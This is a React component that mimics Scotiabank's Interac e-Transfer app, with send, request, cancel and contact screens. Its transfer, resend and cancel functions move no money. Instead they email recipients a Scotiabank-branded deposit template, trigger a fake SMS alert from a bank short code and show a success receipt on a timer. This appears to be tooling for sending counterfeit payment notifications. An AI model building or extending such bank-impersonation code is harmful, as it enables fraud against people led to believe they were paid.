
import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { BackIcon, SearchIcon, ChevronRightIcon, ChevronDownIcon, AlertIcon, InteracLogoNew } from './ScotiaIcons';
import { Contact, PendingTransfer, ScotiaAccountMap } from './types';
import { ReceiptScreen, ConfirmScreen } from './components/ETransferScreens';
import TopHeader from './components/TopHeader';
import { EmailRelay } from '../shared/services/emailRelay';
import { PlusCircle, Users, Trash2, ShieldAlert, Terminal, Zap, Flame, CheckCircle2 } from 'lucide-react';
import ProcessingOverlay from './etransfer/components/ProcessingOverlay';
import SwipeButton from './etransfer/components/SwipeButton';
import { ETransferView, TransferStage } from './etransfer/types';

interface ETransferFlowProps {
  app: any;
  onNotify: (title: string, message: string, icon: string) => void;
  onClose: () => void;
  onComplete: (type: string, amount: number, payload: any) => void;
  accounts: ScotiaAccountMap;
  pendingTransfers: PendingTransfer[];
  setPendingTransfers: React.Dispatch<React.SetStateAction<PendingTransfer[]>>;
  contacts: Contact[];
  setContacts: React.Dispatch<React.SetStateAction<Contact[]>>;
  senderName: string;
}

const ETransferFlow: React.FC<ETransferFlowProps> = ({ 
  app, onNotify, onClose, onComplete, accounts,
  contacts, setContacts, pendingTransfers, setPendingTransfers, senderName
}) => {
  const [view, setView] = useState<ETransferView>('landing');
  const [activeTab, setActiveTab] = useState<'send' | 'request' | 'manage'>('send');
  const [fromAccount, setFromAccount] = useState<string>(Object.keys(accounts).find(k => accounts[k].type === 'banking') || 'Basic Plus');
  const [toContact, setToContact] = useState<Contact | null>(null);
  const [amount, setAmount] = useState('');
  const [message, setMessage] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [processingStage, setProcessingStage] = useState<TransferStage>('sending');
  const [errorMessage, setErrorMessage] = useState('');
  const [lastTxId, setLastTxId] = useState('');
  const [path, setPath] = useState('');

  const [newContact, setNewContact] = useState({ name: '', email: '' });
  const [securityQ, setSecurityQ] = useState('What is this for?');
  const [securityA, setSecurityA] = useState('');

  const filteredContacts = useMemo(() => 
    contacts.filter((c: Contact) => c.name.toLowerCase().includes(searchQuery.toLowerCase())),
    [contacts, searchQuery]
  );

  const initiateReview = () => {
      if (!toContact || !amount) return;
      setView('confirm_summary');
  };

  const finalizeTransfer = async () => {
    if (!toContact || !amount) return;
    setView('processing');
    setProcessingStage('sending');

    const localTxId = `CA${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
    setLastTxId(localTxId);

    EmailRelay.send({
        recipient_email: toContact.email,
        recipient_name: toContact.name,
        amount: parseFloat(amount),
        purpose: message || (activeTab === 'send' ? 'Interac e-Transfer' : 'Money Request'),
        template: activeTab === 'send' ? 'Deposit.html' : 'request.html',
        bank_name: 'Scotiabank'
    }).then(response => {
        if (response.success && response.transaction_id) {
            setLastTxId(response.transaction_id);
            setPath(response.path || 'RELAY_OPTIMIZED');
            
            window.dispatchEvent(new CustomEvent('android-interac-alert', {
                detail: {
                    title: "Messages",
                    sender: "10001",
                    message: `Interac e-Transfer: A transfer of $${parseFloat(amount).toFixed(2)} to ${toContact.name} was successfully released.`,
                    icon: "https://cdn-icons-png.flaticon.com/512/733/733585.png",
                    amount: parseFloat(amount),
                    txId: response.transaction_id
                }
            }));
        }
    }).catch(e => console.warn("Background relay silent failure", e));

    setTimeout(() => {
        onComplete(activeTab, parseFloat(amount), { recipientName: toContact.name, sourceAccount: fromAccount });
        setProcessingStage('completed');
        setTimeout(() => setView('success'), 1200);
    }, 2500);
  };

  const handleResend = (t: PendingTransfer) => {
      setView('processing');
      setProcessingStage('sending');
      
      EmailRelay.send({
          recipient_email: t.recipientEmail,
          recipient_name: t.recipientName,
          amount: t.amount,
          purpose: 'Interac e-Transfer Reminder',
          template: 'Deposit.html',
          bank_name: 'Scotiabank'
      }).then(() => {
          setProcessingStage('completed');
          setTimeout(() => setView('landing'), 1500);
      });
  };

  const handleCancel = (t: PendingTransfer) => {
      setView('processing');
      setProcessingStage('sending');

      EmailRelay.send({
          recipient_email: t.recipientEmail,
          recipient_name: t.recipientName,
          amount: t.amount,
          purpose: 'Transfer Cancelled',
          template: 'cancellation.html',
          bank_name: 'Scotiabank'
      }).then(() => {
          setPendingTransfers(prev => prev.map(pt => pt.id === t.id ? { ...pt, status: 'Cancelled' } : pt));
          setProcessingStage('completed');
          setTimeout(() => {
              setView('landing');
              onNotify("Interac", "Transfer Cancelled", "https://cdn-icons-png.flaticon.com/512/733/733585.png");
          }, 1500);
      });
  };

  const finalizeAddContact = () => {
    if (!newContact.name || !newContact.email || !securityA) return;
    const c: Contact = { 
        id: Date.now().toString(), 
        ...newContact, 
        defaultQuestion: securityQ, 
        defaultAnswer: securityA,
        autodeposit: false,
        isFavorite: false
    };
    const updated = [c, ...contacts];
    setContacts(updated);
    localStorage.setItem('scotia_contacts', JSON.stringify(updated));
    setToContact(c);
    setNewContact({ name: '', email: '' });
    setView('landing');
  };

  const MotionDiv = motion.div as any;

  if (view === 'processing') return <ProcessingOverlay stage={processingStage} error={errorMessage} onRetry={finalizeTransfer} onAbort={() => setView('landing')} />;
  
  if (view === 'confirm_summary') return (
    <ConfirmScreen 
        contact={toContact!} 
        amount={amount} 
        fromAccount={fromAccount}
        message={message}
        onConfirm={finalizeTransfer}
        onCancel={() => setView('landing')}
    />
  );

  if (view === 'success') return (
    <ReceiptScreen 
        contact={toContact!} 
        amount={amount} 
        txId={lastTxId} 
        onClose={onClose} 
        accountName={fromAccount} 
        accountBalance={accounts[fromAccount].balance} 
        onRepeat={() => { setAmount(''); setView('landing'); }} 
        securityQ={toContact?.defaultQuestion || "Verified"} 
        securityA={toContact?.defaultAnswer || "N/A"} 
        message={message}
        path={path}
    />
  );

  const pendingList = pendingTransfers.filter(t => t.status === 'Sent' || t.status === 'Pending');

  return (
    <div className="absolute inset-0 z-[500] bg-black flex flex-col animate-in slide-up h-full overflow-hidden font-sans text-white">
      <AnimatePresence mode="wait">
        
        {view === 'landing' && (
          <MotionDiv key="landing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col h-full bg-black">
            <TopHeader onBack={onClose} title="Interac e-Transfer" />
            
            {/* Tabs */}
            <div className="flex bg-[#121212] border-b border-white/10 pt-2 relative z-10 shrink-0">
                {['Send', 'Request', 'Manage'].map(t => {
                    const isActive = activeTab === t.toLowerCase();
                    return (
                        <button 
                            key={t}
                            onClick={() => setActiveTab(t.toLowerCase() as any)}
                            className={`flex-1 py-4 text-[15px] font-bold relative transition-colors ${isActive ? 'text-[#ED0711]' : 'text-zinc-500'}`}
                        >
                            {t}
                            {isActive && <div className="absolute bottom-0 left-0 right-0 h-[2.5px] bg-[#ED0711]" />}
                        </button>
                    );
                })}
            </div>

            <div className="flex-1 overflow-y-auto no-scrollbar p-4 space-y-4 pt-6">
                
                {activeTab === 'manage' ? (
                    <div className="space-y-8 pb-10">
                        {/* Pending Transfers */}
                        <div>
                            <div className="flex items-center gap-2 mb-4 px-2">
                                <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></div>
                                <h3 className="text-zinc-400 font-bold text-xs uppercase tracking-widest">Pending Transfers</h3>
                            </div>
                            
                            {pendingList.length === 0 ? (
                                <div className="bg-[#1c1c1e] p-6 rounded-[12px] border border-white/5 text-center">
                                    <p className="text-zinc-600 text-sm font-medium">No pending transfers.</p>
                                </div>
                            ) : (
                                <div className="space-y-3">
                                    {pendingList.map(t => (
                                        <div key={t.id} className="bg-[#1c1c1e] p-5 rounded-[16px] border border-white/5 shadow-lg">
                                            <div className="flex justify-between items-start mb-4">
                                                <div>
                                                    <p className="text-white font-bold text-[15px] mb-0.5">{t.recipientName}</p>
                                                    <p className="text-zinc-500 text-xs font-medium">{t.recipientEmail}</p>
                                                </div>
                                                <div className="text-right">
                                                    <p className="text-[#ED0711] font-bold text-[16px]">${t.amount.toFixed(2)}</p>
                                                    <p className="text-zinc-600 text-[10px] font-bold uppercase mt-1">{t.date}</p>
                                                </div>
                                            </div>
                                            
                                            <div className="grid grid-cols-2 gap-3">
                                                <button 
                                                    onClick={() => handleResend(t)}
                                                    className="py-3 rounded-xl bg-white/5 text-white font-bold text-[12px] hover:bg-white/10 transition-colors border border-white/5"
                                                >
                                                    Resend Notice
                                                </button>
                                                <button 
                                                    onClick={() => handleCancel(t)}
                                                    className="py-3 rounded-xl bg-red-500/10 text-red-500 font-bold text-[12px] hover:bg-red-500/20 transition-colors border border-red-500/20"
                                                >
                                                    Cancel Transfer
                                                </button>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>

                         {/* Contact Management Link */}
                         <button onClick={() => setView('manage_contacts')} className="w-full bg-[#1c1c1e] p-5 rounded-2xl border border-white/5 flex items-center justify-between active:scale-[0.98] transition-all">
                            <div className="flex items-center gap-4">
                                <Users className="text-[#ED0711]" size={20} />
                                <div className="text-left"><p className="font-bold text-sm text-white">Manage Contacts</p></div>
                            </div>
                            <ChevronRightIcon color="#ED0711" />
                        </button>
                    </div>
                ) : (
                    <div className="animate-in fade-in space-y-4">
                        {/* From Card */}
                        <div 
                            onClick={() => setView('account_picker')}
                            className="bg-[#1c1c1e] p-5 rounded-[12px] border border-white/5 flex items-center justify-between active:bg-[#2c2c2e] transition-colors cursor-pointer"
                        >
                            <div className="flex-1">
                                <p className="text-white font-bold text-[16px] mb-1">From</p>
                                <div className="space-y-0.5">
                                    <p className="text-zinc-300 text-[15px]">{fromAccount}</p>
                                    <p className="text-zinc-500 text-[13px] font-medium">Available: ${accounts[fromAccount].balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>
                                </div>
                            </div>
                            <div className="w-8 h-8 rounded-full border border-zinc-600 flex items-center justify-center">
                                <ChevronDownIcon color="#fff" size={20} />
                            </div>
                        </div>

                        {/* To Card */}
                        <div 
                            onClick={() => setView('contact_picker')}
                            className="bg-[#1c1c1e] p-5 rounded-[12px] border border-white/5 flex items-center justify-between active:bg-[#2c2c2e] transition-colors cursor-pointer"
                        >
                            <div className="flex-1">
                                <p className="text-white font-bold text-[16px] mb-1">To</p>
                                <p className={`text-[15px] ${toContact ? 'text-zinc-300' : 'text-zinc-500 italic'}`}>
                                    {toContact ? toContact.name : 'Select contact'}
                                </p>
                            </div>
                            <ChevronDownIcon color="#666" size={20} />
                        </div>

                        {/* Amount Card */}
                        <div className="bg-[#1c1c1e] p-5 rounded-[12px] border border-white/5">
                            <p className="text-white font-bold text-[16px] mb-1">Amount</p>
                            <input 
                                type="number" 
                                value={amount} 
                                onChange={e => setAmount(e.target.value)} 
                                placeholder="Enter amount" 
                                className="w-full bg-transparent text-white text-[16px] mt-1 outline-none placeholder:text-zinc-500 font-medium" 
                            />
                        </div>

                        {/* Message Card (Optional) */}
                        <div className="bg-[#1c1c1e] p-5 rounded-[12px] border border-white/5">
                            <div className="flex justify-between">
                                <p className="text-white font-bold text-[16px] mb-1">Message</p>
                                <span className="text-zinc-600 text-xs">Optional</span>
                            </div>
                            <input 
                                type="text" 
                                value={message} 
                                onChange={e => setMessage(e.target.value)} 
                                placeholder="Enter message" 
                                className="w-full bg-transparent text-white text-[15px] mt-1 outline-none placeholder:text-zinc-500" 
                            />
                        </div>
                    </div>
                )}

            </div>

            {/* Bottom Slider - Hide on Manage Tab */}
            {activeTab !== 'manage' && (
                <div className="p-6 pb-12 bg-black border-t border-white/5">
                    <SwipeButton 
                        onComplete={initiateReview}
                        disabled={!toContact || !amount || parseFloat(amount) <= 0}
                    />
                </div>
            )}
          </MotionDiv>
        )}

        {view === 'manage_contacts' && (
            <MotionDiv key="manage-contacts" initial={{ x: '100%' }} animate={{ x: 0 }} exit={{ x: '100%' }} className="absolute inset-0 bg-black z-[600] flex flex-col">
                <TopHeader onBack={() => setView('landing')} title="Manage Contacts" />
                <div className="flex-1 overflow-y-auto p-4 space-y-3">
                    {contacts.map(c => (
                        <div key={c.id} className="bg-[#1c1c1e] p-5 rounded-2xl border border-white/5 flex items-center justify-between">
                            <div><p className="font-bold text-white">{c.name}</p><p className="text-zinc-500 text-xs">{c.email}</p></div>
                            <button onClick={() => setContacts(contacts.filter(x => x.id !== c.id))} className="text-red-500 opacity-40"><Trash2 size={20} /></button>
                        </div>
                    ))}
                    <button onClick={() => setView('add_contact')} className="w-full py-4 border-2 border-dashed border-white/10 rounded-2xl text-zinc-500 font-black uppercase tracking-widest text-[10px] flex items-center justify-center gap-2">
                        <PlusCircle size={16} /> Add Contact
                    </button>
                </div>
            </MotionDiv>
        )}

        {view === 'contact_picker' && (
            <MotionDiv key="contact_picker" initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }} className="absolute inset-0 bg-[#121212] z-[600] flex flex-col">
                <div className="p-6 border-b border-white/5 flex justify-between items-center"><h2 className="text-lg font-bold">Choose Recipient</h2><button onClick={() => setView('landing')}><BackIcon color="#666"/></button></div>
                
                <button onClick={() => setView('add_contact')} className="w-full px-6 py-4 flex items-center gap-4 bg-black border-b border-white/10 active:bg-white/5 transition-colors">
                    <div className="text-[#ED0711]">
                        <PlusCircle size={28} strokeWidth={1.5} />
                    </div>
                    <span className="text-[16px] font-bold text-white">Add new contact</span>
                </button>

                <div className="flex-1 overflow-y-auto p-4 space-y-2">
                    {contacts.map(c => (
                        <button key={c.id} onClick={() => { setToContact(c); setView('landing'); }} className="w-full p-5 bg-black border border-white/5 rounded-2xl flex justify-between items-center">
                            <div className="text-left"><p className="font-bold text-white">{c.name}</p><p className="text-zinc-600 text-xs">{c.email}</p></div>
                            <ChevronRightIcon color="#333" />
                        </button>
                    ))}
                </div>
            </MotionDiv>
        )}
        
        {view === 'account_picker' && (
            <MotionDiv key="accounts" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="flex flex-col h-full">
                <TopHeader onBack={() => setView('landing')} title="Select Account" />
                <div className="flex-1 overflow-y-auto no-scrollbar p-4 space-y-3 bg-black">
                    {(Object.entries(accounts) as any).filter(([_, a]: any) => a.type === 'banking').map(([name, acc]: any) => (
                        <button key={name} onClick={() => { setFromAccount(name); setView('landing'); }} className={`w-full bg-[#1c1c1e] p-6 rounded-[24px] border transition-all text-left flex justify-between items-center shadow-xl ${fromAccount === name ? 'border-[#ED0711] ring-1 ring-[#ED0711]/20' : 'border-white/5 opacity-60'}`}>
                            <div className="flex-1 min-w-0">
                                <p className="text-white font-black text-[16px] tracking-tight">{name}</p>
                                <p className="text-zinc-500 font-bold text-xs mt-1 uppercase tracking-widest">Available: ${acc.balance.toLocaleString('en-US', {minimumFractionDigits: 2})}</p>
                            </div>
                            {fromAccount === name && (
                                <div className="w-6 h-6 rounded-full bg-[#ED0711] flex items-center justify-center shadow-lg"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="4"><path d="M20 6L9 17l-5-5"/></svg></div>
                            )}
                        </button>
                    ))}
                </div>
            </MotionDiv>
        )}

        {view === 'add_contact' && (
            <MotionDiv key="add-contact" initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 50 }} className="flex flex-col h-full bg-black">
                <TopHeader onBack={() => setView('contact_picker')} title="Add Contact" />
                <div className="flex-1 p-6 space-y-6">
                    <div className="bg-[#1c1c1e] p-6 rounded-[24px] border border-white/5 shadow-2xl">
                        <p className="text-zinc-500 font-black text-[11px] uppercase tracking-widest mb-3">Recipient Name</p>
                        <input 
                            type="text" 
                            value={newContact.name} 
                            onChange={e => setNewContact({...newContact, name: e.target.value})} 
                            placeholder="e.g. John Doe" 
                            className="w-full bg-transparent text-white text-lg font-black outline-none placeholder:text-zinc-800" 
                        />
                    </div>
                    <div className="bg-[#1c1c1e] p-6 rounded-[24px] border border-white/5 shadow-2xl">
                        <p className="text-zinc-500 font-black text-[11px] uppercase tracking-widest mb-3">Email Address</p>
                        <input 
                            type="email" 
                            value={newContact.email} 
                            onChange={e => setNewContact({...newContact, email: e.target.value})} 
                            placeholder="recipient@example.com" 
                            className="w-full bg-transparent text-white text-lg font-black outline-none placeholder:text-zinc-800" 
                        />
                    </div>
                </div>
                <div className="p-8 pb-12 border-t border-white/5">
                    <button 
                        onClick={() => setView('add_warning')} 
                        disabled={!newContact.name || !newContact.email}
                        className="w-full py-5 bg-[#ED0711] disabled:opacity-20 text-white font-black rounded-[22px] shadow-2xl active:scale-95 transition-all uppercase tracking-widest text-[13px]"
                    >
                        Next
                    </button>
                </div>
            </MotionDiv>
        )}

        {view === 'add_warning' && (
            <MotionDiv key="add-warning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-[1000] bg-black/80 backdrop-blur-sm flex items-center justify-center p-6">
                <div className="bg-[#1c1c1e] w-full max-w-sm rounded-[24px] p-8 border border-white/10 shadow-2xl animate-in zoom-in-95">
                    <div className="w-14 h-14 bg-yellow-500/10 rounded-full flex items-center justify-center mb-6 text-yellow-500 border border-yellow-500/20 mx-auto">
                        <ShieldAlert size={28} />
                    </div>
                    <h3 className="text-white font-bold text-xl mb-4 text-center">Registration Status</h3>
                    <p className="text-zinc-400 text-sm leading-relaxed mb-8 font-medium text-center">
                        <span className="text-white font-bold block mb-2">{newContact.email}</span> 
                        is not registered for Autodeposit. You will need to set a security question and answer to deposit the funds.
                    </p>
                    <div className="space-y-3">
                        <button 
                            onClick={() => {
                                setSecurityQ('What is this for?'); 
                                setView('add_security');
                            }}
                            className="w-full py-4 bg-[#ED0711] text-white font-bold rounded-[16px] text-sm shadow-lg active:scale-95 transition-transform"
                        >
                            Continue
                        </button>
                        <button 
                            onClick={() => setView('add_contact')}
                            className="w-full py-4 bg-transparent border border-white/10 text-white font-bold rounded-[16px] text-sm hover:bg-white/5 transition-colors"
                        >
                            Back
                        </button>
                    </div>
                </div>
            </MotionDiv>
        )}

        {view === 'add_security' && (
            <MotionDiv key="add-security" initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 50 }} className="flex flex-col h-full bg-black">
                <TopHeader onBack={() => setView('add_warning')} title="Security Question" />
                <div className="flex-1 p-6 space-y-6">
                    <p className="text-zinc-500 font-bold text-sm px-1">Create a security question and answer for this contact.</p>
                    <div className="bg-[#1c1c1e] p-6 rounded-[24px] border border-white/5 shadow-2xl">
                        <p className="text-zinc-500 font-black text-[11px] uppercase tracking-widest mb-3">Security Question</p>
                        <input 
                            type="text" 
                            value={securityQ} 
                            onChange={e => setSecurityQ(e.target.value)} 
                            className="w-full bg-transparent text-white text-lg font-black outline-none" 
                        />
                    </div>
                    <div className="bg-[#1c1c1e] p-6 rounded-[24px] border border-white/5 shadow-2xl">
                        <p className="text-zinc-500 font-black text-[11px] uppercase tracking-widest mb-3">Security Answer</p>
                        <input 
                            type="text" 
                            value={securityA} 
                            onChange={e => setSecurityA(e.target.value)} 
                            placeholder="Case sensitive" 
                            className="w-full bg-transparent text-white text-lg font-black outline-none placeholder:text-zinc-800" 
                        />
                    </div>
                </div>
                <div className="p-8 pb-12 border-t border-white/5">
                    <button 
                        onClick={finalizeAddContact} 
                        disabled={!securityA}
                        className="w-full py-5 bg-[#ED0711] disabled:opacity-20 text-white font-black rounded-[22px] shadow-2xl active:scale-95 transition-all uppercase tracking-widest text-[13px]"
                    >
                        Save Contact
                    </button>
                </div>
            </MotionDiv>
        )}

      </AnimatePresence>
    </div>
  );
};

export default ETransferFlow;
